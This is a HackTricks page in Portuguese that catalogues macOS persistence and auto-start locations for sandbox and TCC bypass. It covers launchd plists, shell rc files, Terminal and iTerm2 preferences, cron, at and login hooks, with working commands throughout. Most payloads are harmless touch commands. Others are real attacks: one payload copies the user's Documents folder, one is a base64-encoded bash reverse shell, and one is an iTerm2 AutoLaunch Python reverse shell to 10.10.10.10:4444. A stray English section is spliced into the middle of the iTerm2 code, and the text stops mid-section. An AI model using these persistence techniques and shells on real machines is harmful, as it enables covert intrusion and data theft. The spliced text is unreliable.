# Auto Inicialização no macOS

<details>

<summary><strong>Aprenda hacking AWS do zero ao avançado com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira [**produtos oficiais PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Esta seção é fortemente baseada na série de blogs [**Além dos bons e velhos LaunchAgents**](https://theevilbit.github.io/beyond/), o objetivo é adicionar **mais Locais de Auto Inicialização** (se possível), indicar **quais técnicas ainda estão funcionando** atualmente com a última versão do macOS (13.4) e especificar as **permissões** necessárias.

## Bypass de Sandbox

{% hint style="success" %}
Aqui você pode encontrar locais de inicialização úteis para **burlar a sandbox** que permite simplesmente executar algo **escrevendo em um arquivo** e **aguardando** por uma **ação muito comum**, um **determinado período de tempo** ou uma **ação que você normalmente pode realizar** de dentro de uma sandbox sem precisar de permissões de root.
{% endhint %}

### Launchd

* Útil para burlar a sandbox: [✅](https://emojipedia.org/check-mark-button)
* Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Locais

* **`/Library/LaunchAgents`**
* **Gatilho**: Reinicialização
* Root necessário
* **`/Library/LaunchDaemons`**
* **Gatilho**: Reinicialização
* Root necessário
* **`/System/Library/LaunchAgents`**
* **Gatilho**: Reinicialização
* Root necessário
* **`/System/Library/LaunchDaemons`**
* **Gatilho**: Reinicialização
* Root necessário
* **`~/Library/LaunchAgents`**
* **Gatilho**: Reentrada
* **`~/Library/LaunchDemons`**
* **Gatilho**: Reentrada

#### Descrição e Exploração

**`launchd`** é o **primeiro** **processo** executado pelo kernel do macOS na inicialização e o último a ser encerrado no desligamento. Ele sempre deve ter o **PID 1**. Esse processo irá **ler e executar** as configurações indicadas nos **plists** **ASEP** em:

* `/Library/LaunchAgents`: Agentes por usuário instalados pelo administrador
* `/Library/LaunchDaemons`: Daemons em todo o sistema instalados pelo administrador
* `/System/Library/LaunchAgents`: Agentes por usuário fornecidos pela Apple.
* `/System/Library/LaunchDaemons`: Daemons em todo o sistema fornecidos pela Apple.

Quando um usuário faz login, os plists localizados em `/Users/$USER/Library/LaunchAgents` e `/Users/$USER/Library/LaunchDemons` são iniciados com as **permissões dos usuários logados**.

A **principal diferença entre agentes e daemons é que os agentes são carregados quando o usuário faz login e os daemons são carregados na inicialização do sistema** (pois existem serviços como ssh que precisam ser executados antes que qualquer usuário acesse o sistema). Além disso, os agentes podem usar a GUI enquanto os daemons precisam ser executados em segundo plano.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Existem casos em que um **agente precisa ser executado antes do login do usuário**, esses são chamados de **PreLoginAgents**. Por exemplo, isso é útil para fornecer tecnologia assistiva no login. Eles também podem ser encontrados em `/Library/LaunchAgents` (veja [**aqui**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) um exemplo).

{% hint style="info" %}
Novos arquivos de configuração de Daemons ou Agents serão **carregados após o próximo reinício ou usando** `launchctl load <target.plist>` Também é possível carregar arquivos .plist **sem a extensão** com `launchctl -F <file>` (no entanto, esses arquivos plist não serão carregados automaticamente após o reinício).\
Também é possível **descarregar** com `launchctl unload <target.plist>` (o processo apontado por ele será encerrado).

Para **garantir** que não haja **nada** (como uma substituição) **impedindo** um **Agente** ou **Daemon** **de** **ser executado**, execute: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`
{% endhint %}

Liste todos os agentes e daemons carregados pelo usuário atual:
```bash
launchctl list
```
{% hint style="warning" %}
Se um plist é de propriedade de um usuário, mesmo que esteja em pastas de sistema de daemon, a **tarefa será executada como o usuário** e não como root. Isso pode prevenir alguns ataques de escalonamento de privilégios.
{% endhint %}

### arquivos de inicialização do shell

Writeup: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
* Bypass do TCC: [✅](https://emojipedia.org/check-mark-button)
* Mas você precisa encontrar um aplicativo com um bypass do TCC que execute um shell que carregue esses arquivos

#### Localizações

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
* **Gatilho**: Abrir um terminal com zsh
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
* **Gatilho**: Abrir um terminal com zsh
* Root necessário
* **`~/.zlogout`**
* **Gatilho**: Sair de um terminal com zsh
* **`/etc/zlogout`**
* **Gatilho**: Sair de um terminal com zsh
* Root necessário
* Potencialmente mais em: **`man zsh`**
* **`~/.bashrc`**
* **Gatilho**: Abrir um terminal com bash
* `/etc/profile` (não funcionou)
* `~/.profile` (não funcionou)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
* **Gatilho**: Esperado para ser acionado com xterm, mas **não está instalado** e mesmo após instalado esse erro é exibido: xterm: `DISPLAY is not set`

#### Descrição & Exploração

Ao iniciar um ambiente de shell como `zsh` ou `bash`, **certos arquivos de inicialização são executados**. Atualmente, o macOS usa `/bin/zsh` como shell padrão. Esse shell é acessado automaticamente quando o aplicativo Terminal é lançado ou quando um dispositivo é acessado via SSH. Embora `bash` e `sh` também estejam presentes no macOS, eles precisam ser explicitamente invocados para serem usados.

A página de manual do zsh, que pode ser lida com **`man zsh`**, tem uma descrição detalhada dos arquivos de inicialização.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Aplicações Reabertas

{% hint style="danger" %}
Configurar a exploração indicada e sair e entrar novamente ou até mesmo reiniciar não funcionou para mim para executar o aplicativo. (O aplicativo não estava sendo executado, talvez precise estar em execução quando essas ações são realizadas)
{% endhint %}

**Descrição**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
* Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **Gatilho**: Reiniciar a abertura de aplicativos

#### Descrição e Exploração

Todas as aplicações a serem reabertas estão dentro do plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Portanto, para fazer com que as aplicações reabertas iniciem a sua própria, você só precisa **adicionar seu aplicativo à lista**.

O UUID pode ser encontrado listando esse diretório ou com `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Para verificar as aplicações que serão reabertas, você pode fazer:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Para **adicionar um aplicativo a esta lista**, você pode usar:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Preferências do Terminal

* Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
* Bypass do TCC: [✅](https://emojipedia.org/check-mark-button)
* O Terminal deve ter permissões do FDA se o usuário o utilizar

#### Localização

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **Gatilho**: Abrir o Terminal

#### Descrição e Exploração

Em **`~/Library/Preferences`** são armazenadas as preferências do usuário nas Aplicações. Algumas dessas preferências podem conter uma configuração para **executar outras aplicações/scripts**.

Por exemplo, o Terminal pode executar um comando na inicialização:

<figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>

Essa configuração é refletida no arquivo **`~/Library/Preferences/com.apple.Terminal.plist`** assim:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Então, se o plist das preferências do terminal no sistema puder ser sobrescrito, a funcionalidade **`open`** pode ser usada para **abrir o terminal e executar esse comando**.

Você pode adicionar isso a partir da linha de comando com:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### Scripts do Terminal / Outras extensões de arquivo

* Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
* Contorno do TCC: [✅](https://emojipedia.org/check-mark-button)
* O Terminal usa permissões do FDA se o usuário o utilizar

#### Localização

* **Qualquer lugar**
* **Gatilho**: Abrir o Terminal

#### Descrição e Exploração

Se você criar um script **`.terminal`** e o abrir, o aplicativo **Terminal** será automaticamente invocado para executar os comandos indicados nele. Se o aplicativo Terminal tiver alguns privilégios especiais (como TCC), seu comando será executado com esses privilégios especiais.

Experimente com:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
### Extensões de Áudio

Descrição: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Descrição: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

* Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
* Bypass TCC: [🟠](https://emojipedia.org/large-orange-circle)
* Pode obter acesso extra ao TCC

#### Localização

* **`/Library/Audio/Plug-Ins/HAL`**
* Requer privilégios de root
* **Gatilho**: Reiniciar o coreaudiod ou o computador
* **`/Library/Audio/Plug-ins/Components`**
* Requer privilégios de root
* **Gatilho**: Reiniciar o coreaudiod ou o computador
* **`~/Library/Audio/Plug-ins/Components`**
* **Gatilho**: Reiniciar o coreaudiod ou o computador
* **`/System/Library/Components`**
* Requer privilégios de root
* **Gatilho**: Reiniciar o coreaudiod ou o computador

#### Descrição

De acordo com os relatórios anteriores, é possível **compilar alguns plugins de áudio** e carregá-los.

### Extensões QuickLook

Descrição: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
* Bypass TCC: [🟠](https://emojipedia.org/large-orange-circle)
* Pode obter acesso extra ao TCC

#### Localização

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/NomeDoAplicativo/Aplicativo/Conteúdo/Biblioteca/QuickLook/`
* `~/Applications/NomeDoAplicativo/Aplicativo/Conteúdo/Biblioteca/QuickLook/`

#### Descrição & Exploração

As extensões QuickLook podem ser executadas quando você **aciona a visualização de um arquivo** (pressione a barra de espaço com o arquivo selecionado no Finder) e um **plugin que suporta esse tipo de arquivo** está instalado.

É possível compilar sua própria extensão QuickLook, colocá-la em uma das localizações anteriores para carregá-la e depois ir para um arquivo suportado e pressionar espaço para ativá-la.

### ~~Ganchos de Login/Logout~~

{% hint style="danger" %}
Isso não funcionou para mim, nem com o LoginHook do usuário nem com o LogoutHook do root
{% endhint %}

**Descrição**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

* Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
* Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

* Você precisa ser capaz de executar algo como `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
* Localizado em `~/Library/Preferences/com.apple.loginwindow.plist`

Eles estão obsoletos, mas podem ser usados para executar comandos quando um usuário faz login.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Este ajuste é armazenado em `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Para deletar:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
O usuário root é armazenado em **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Bypass Condicional de Sandbox

{% hint style="success" %}
Aqui você pode encontrar locais de inicialização úteis para **burlar a sandbox** que permite que você simplesmente execute algo **escrevendo em um arquivo** e **não esperando condições super comuns** como programas específicos instalados, ações de usuário "pouco comuns" ou ambientes.
{% endhint %}

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* Útil para burlar a sandbox: [✅](https://emojipedia.org/check-mark-button)
* No entanto, você precisa ser capaz de executar o binário `crontab`
* Ou ser root
* Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* Root necessário para acesso direto de escrita. Root não é necessário se você puder executar `crontab <arquivo>`
* **Gatilho**: Depende do trabalho cron

#### Descrição e Exploração

Liste os trabalhos cron do **usuário atual** com:
```bash
crontab -l
```
Você também pode ver todos os trabalhos cron dos usuários em **`/usr/lib/cron/tabs/`** e **`/var/at/tabs/`** (necessita de permissão de root).

No MacOS, várias pastas que executam scripts com **certa frequência** podem ser encontradas em:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Aqui você pode encontrar os **trabalhos cron** regulares, os **trabalhos at** (não muito usados) e os **trabalhos periódicos** (principalmente usados para limpar arquivos temporários). Os trabalhos periódicos diários podem ser executados, por exemplo, com: `periodic daily`.

Para adicionar um **trabalho cron do usuário programaticamente**, é possível usar:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Descrição: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
* Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
* iTerm2 costumava ter permissões TCC concedidas

#### Localizações

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **Gatilho**: Abrir iTerm
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **Gatilho**: Abrir iTerm
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **Gatilho**: Abrir iTerm

#### Descrição e Exploração

Scripts armazenados em **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** serão executados. Por exemplo:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
## macOS Auto Start Locations

### Launch Agents

Launch Agents are used to run processes when a user logs in. They are stored in `~/Library/LaunchAgents/` and `/Library/LaunchAgents/`.

### Launch Daemons

Launch Daemons are used to run processes at system startup. They are stored in `/Library/LaunchDaemons/`.

### Login Items

Login Items are applications that open when a user logs in. They can be managed in `System Preferences > Users & Groups > Login Items`.

### Startup Items

Startup Items are legacy items that automatically launch when a user logs in. They are stored in `/Library/StartupItems/`.
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
O script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** também será executado:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
O arquivo de preferências do iTerm2 localizado em **`~/Library/Preferences/com.googlecode.iterm2.plist`** pode **indicar um comando a ser executado** quando o terminal do iTerm2 é aberto.

Essa configuração pode ser feita nas configurações do iTerm2:

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

E o comando é refletido nas preferências:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Você pode definir o comando a ser executado com:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
Altamente provável que existam **outras maneiras de abusar das preferências do iTerm2** para executar comandos arbitrários.
{% endhint %}

### xbar

Descrição: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
* Mas o xbar deve estar instalado
* Bypass do TCC: [✅](https://emojipedia.org/check-mark-button)
* Ele solicita permissões de Acessibilidade

#### Localização

* **`~/Library/Application\ Support/xbar/plugins/`**
* **Gatilho**: Uma vez que o xbar é executado

#### Descrição

Se o programa popular [**xbar**](https://github.com/matryer/xbar) estiver instalado, é possível escrever um script shell em **`~/Library/Application\ Support/xbar/plugins/`** que será executado quando o xbar for iniciado:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Descrição**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

* Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
* Mas o Hammerspoon deve estar instalado
* Bypass do TCC: [✅](https://emojipedia.org/check-mark-button)
* Requer permissões de Acessibilidade

#### Localização

* **`~/.hammerspoon/init.lua`**
* **Gatilho**: Uma vez que o Hammerspoon é executado

#### Descrição

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) atua como uma plataforma de automação para o **macOS**, utilizando a linguagem de script **LUA** para suas operações. Notavelmente, suporta a integração de código completo do AppleScript e a execução de scripts de shell, aprimorando significativamente suas capacidades de script.

O aplicativo procura por um único arquivo, `~/.hammerspoon/init.lua`, e quando iniciado, o script será executado.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

* Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
* Mas o BetterTouchTool deve estar instalado
* Bypass do TCC: [✅](https://emojipedia.org/check-mark-button)
* Solicita permissões de Automação-Atalhos e Acessibilidade

#### Localização

* `~/Library/Application Support/BetterTouchTool/*`

Esta ferramenta permite indicar aplicativos ou scripts para executar quando alguns atalhos são pressionados. Um atacante pode configurar seu próprio atalho e ação para executar no banco de dados para fazer com que ele execute código arbitrário (um atalho poderia ser apenas pressionar uma tecla).

### Alfred

* Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
* Mas o Alfred deve estar instalado
* Bypass do TCC: [✅](https://emojipedia.org/check-mark-button)
* Solicita permissões de Automação, Acessibilidade e até acesso total ao disco

#### Localização

* `???`

Permite criar fluxos de trabalho que podem executar código quando certas condições são atendidas. Potencialmente, é possível para um atacante criar um arquivo de fluxo de trabalho e fazer o Alfred carregá-lo (é necessário pagar pela versão premium para usar fluxos de trabalho).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
* Mas o ssh precisa estar habilitado e em uso
* Bypass do TCC: [✅](https://emojipedia.org/check-mark-button)
* O SSH costuma ter acesso total ao disco

#### Localização

* **`~/.ssh/rc`**
* **Gatilho**: Login via ssh
* **`/etc/ssh/sshrc`**
* Requer privilégios de root
* **Gatilho**: Login via ssh

{% hint style="danger" %}
Para ativar o ssh, é necessário Acesso Total ao Disco:
```bash
sudo systemsetup -setremotelogin on
```
{% endhint %}

#### Descrição & Exploração

Por padrão, a menos que `PermitUserRC no` em `/etc/ssh/sshd_config`, quando um usuário **faz login via SSH** os scripts **`/etc/ssh/sshrc`** e **`~/.ssh/rc`** serão executados.

### **Itens de Login**

Descrição: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
* Mas é necessário executar `osascript` com argumentos
* Contorno TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localizações

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **Gatilho:** Login
* Payload de exploração armazenado chamando **`osascript`**
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **Gatilho:** Login
* Requer privilégios de root

#### Descrição

Em Preferências do Sistema -> Usuários e Grupos -> **Itens de Login** você pode encontrar **itens a serem executados quando o usuário faz login**.\
É possível listá-los, adicionar e remover a partir da linha de comando:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Estes itens são armazenados no arquivo **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

Os **itens de login** também podem ser indicados usando a API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) que armazenará a configuração em **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP como Item de Login

(Verifique a seção anterior sobre Itens de Login, esta é uma extensão)

Se você armazenar um arquivo **ZIP** como um **Item de Login**, o **`Archive Utility`** o abrirá e se o zip, por exemplo, estiver armazenado em **`~/Library`** e contiver a pasta **`LaunchAgents/file.plist`** com uma backdoor, essa pasta será criada (não é por padrão) e o plist será adicionado para que na próxima vez que o usuário fizer login novamente, a **backdoor indicada no plist será executada**.

Outra opção seria criar os arquivos **`.bash_profile`** e **`.zshenv`** dentro do diretório do usuário, então se a pasta LaunchAgents já existir, essa técnica ainda funcionaria.

### At

Artigo: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

* Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
* Mas você precisa **executar** o **`at`** e ele deve estar **habilitado**
* Bypass do TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

* Precisa **executar** o **`at`** e ele deve estar **habilitado**

#### **Descrição**

As tarefas `at` são projetadas para **agendar tarefas únicas** a serem executadas em horários específicos. Ao contrário dos cron jobs, as tarefas `at` são automaticamente removidas após a execução. É crucial observar que essas tarefas são persistentes através de reinicializações do sistema, o que as torna potenciais preocupações de segurança sob certas condições.

Por **padrão**, elas estão **desabilitadas**, mas o usuário **root** pode **habilitá-las** com:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Isso criará um arquivo em 1 hora:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Verifique a fila de trabalhos usando `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Acima podemos ver dois trabalhos agendados. Podemos imprimir os detalhes do trabalho usando `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
Se as tarefas AT não estiverem habilitadas, as tarefas criadas não serão executadas.
{% endhint %}

Os **arquivos de tarefa** podem ser encontrados em `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
O nome do arquivo contém a fila, o número do trabalho e o horário agendado para ser executado. Por exemplo, vamos dar uma olhada em `a0001a019bdcd2`.

- `a` - esta é a fila
- `0001a` - número do trabalho em hexadecimal, `0x1a = 26`
- `019bdcd2` - tempo em hexadecimal. Representa os minutos passados desde o epoch. `0x019bdcd2` é `26991826` em decimal. Se multiplicarmos por 60, obtemos `1619509560`, que é `GMT: 27 de abril de 2021, terça-feira 7:46:00`.

Se imprimirmos o arquivo de trabalho, encontramos que ele contém as mesmas informações que obtivemos usando `at -c`.

### Ações de Pasta

Análise: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Análise: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
